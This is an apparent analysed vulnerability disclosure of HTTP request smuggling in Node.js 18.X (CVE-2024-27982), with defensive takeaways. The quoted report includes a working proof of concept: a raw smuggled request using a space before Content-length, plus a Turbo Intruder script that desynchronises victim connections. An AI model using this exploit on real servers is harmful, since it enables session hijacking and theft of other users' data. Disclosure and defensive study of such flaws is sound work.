# HTTP Request Smuggling via Content-Length Header Obfuscation in Node.js 18.X

## Metadata
- **Source:** HackerOne
- **Report:** 2237099 | https://hackerone.com/reports/2237099
- **Submitted:** 2023-11-02
- **Reporter:** bpingel
- **Program:** Node.js
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** HTTP Request Smuggling, Header Parsing Bypass, Request Desynchronization
- **CVEs:** CVE-2024-27982
- **Category:** uncategorised

## Summary
Node.js 18.X default HTTP server fails to correctly parse Content-Length headers when preceded by a whitespace character, allowing attackers to smuggle arbitrary HTTP requests through the body. This enables session hijacking, request interception, and request poisoning against concurrent users on affected servers.

## Attack scenario
1. Attacker crafts a malicious HTTP POST request with a space character before the Content-Length header (e.g., ' Content-length: 43')
2. The malicious request body contains a complete secondary HTTP GET request targeting sensitive endpoints (e.g., '/bye')
3. Attacker sends the crafted request to the vulnerable Node.js 18.X server while legitimate users are making concurrent requests
4. The server misparses the whitespace-prefixed Content-Length, causing it to not properly delimit the first request
5. A subsequent legitimate user's request is processed as part of the previous request's body or pipeline
6. The smuggled request executes on the victim's connection, potentially stealing session identifiers or sensitive headers (e.g., x-name parameter reflected in response)

## Root cause
Node.js HTTP parser incorrectly handles Content-Length headers with leading whitespace, failing to recognize them as valid header directives. This allows request body boundaries to be misaligned between the client and server, enabling HTTP request smuggling in HTTP/1.1 connection reuse scenarios.

## Attacker mindset
An attacker would recognize this as a critical desynchronization vulnerability enabling connection hijacking. They would focus on: (1) timing attacks to align malicious requests with victim requests, (2) stealing session cookies or authentication headers, (3) forcing victims to execute unintended actions, (4) poisoning shared connection pools in load-balanced environments.

## Defensive takeaways
- Validate and normalize all HTTP headers before processing, rejecting headers with invalid whitespace formatting
- Implement strict HTTP/1.1 parsing per RFC 7230, treating whitespace-prefixed headers as malformed
- Use HTTP/2 or HTTP/3 which eliminate request smuggling vectors through frame-based multiplexing
- Deploy WAF rules to detect and block requests with anomalous header formatting (leading whitespace on standard headers)
- Implement connection-level request validation and length verification before routing to application handlers
- Monitor for request timing anomalies and unexpected response content that may indicate request smuggling attempts
- Keep Node.js runtime updated to patched versions that properly validate HTTP header syntax

## Variant hunting
Search for similar header parsing bypasses in other HTTP servers using whitespace obfuscation (Transfer-Encoding, Host header variants). Check for CL.TE and TE.CL request smuggling patterns with malformed headers in other runtime versions. Test other whitespace characters (tabs, special Unicode spaces) before header names.

## MITRE ATT&CK
- T1190
- T1200
- T1557

## Notes
This vulnerability requires HTTP/1.1 connection reuse (persistent connections/pipelining) to succeed. Impact is amplified in shared hosting, reverse proxy, and load-balancer environments where multiple users share backend connections. The proof-of-concept demonstrates response interception where victim responses leak to attacker-controlled requests. Timeline and patch status not provided in report.

## Full report
<details><summary>Expand</summary>

**Summary:** The default web service in the most recent version of 18.X seems to have an issue with the interpretation of malformed headers. If a space is left before a content-length header then the header is not read correctly. This leaves the ability to smuggle in a second request as the body of the first.

**Description:** HTTP request smuggling is present in applications running on the current version of the 18.X Node JS available for download from nodejs.org. When a space is placed before the content length header of a request it is not interpreted correctly and as a result the beginning of another request can be smuggled in the body. Formatted correctly it can consume portions of other user's requests or force them to access paths they did not intend to.

## Steps To Reproduce:

This simple Node JS application was used for replication and showing of desync in identification parameters within requests.

```
const http = require('http');
const port = 8082;

const server = http.createServer((req, res) => {
  if (req.url === '/hello') {
    console.log(JSON.stringify(req.headers));
    console.log('%s', req.url);
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello, World!\n');
  } else if (req.url === '/bye') {
    console.log('%s', req.url)
    console.log(JSON.stringify(req.headers));
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    const name = req.headers['x-name'] || 'World';
    res.end(`Goodbye, ${name}!\n`);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Route not found\n');
  }
});

server.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});
```
and the smuggled request would look like this
```
POST /hello HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
 Content-length: 43
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

GET /bye HTTP/1.1
x-name: Bob%s
X-YzBqv: 
```
With `x-name` header being the header used to have an ID present in the request be reflected in the response.


  1. Start up an application using the current version of Node JS 18, sample application above provided.
  2. This testing was done using the Turbo Intruder with the following script to simulate both an attacker poisoning the web socket as well as a legitimate user sending a request to the web service.

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    for word in range(1, 100):
        if word % 2:
            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
            CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
            engine.queue(CleanReq, word)
        engine.queue(target.req, word)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    table.add(req)
```

{F2823458}

  3. During these requests to /hello you will begin to receive responses from the /bye url. The content-length header in regular request is swapped out with a test ID header to track which request ID is receiving which poisoned requests back. 

## Impact: Using this vulnerability we've already shown that a malicious user can affect the connections of regular users and in worst cases this can be used to steal session data from users as with the right formatting a request could be smuggled that can consume another users entire request, session data and all. As in this log you can see that the first line of a request is being consumed by a header, but this can be completed in other ways to consume more of a request.
{F2823460}

## Impact

Potential full compromise of users sessions on any service running a vulnerable version.

</details>

---
*Analysed by Claude on 2026-05-24*
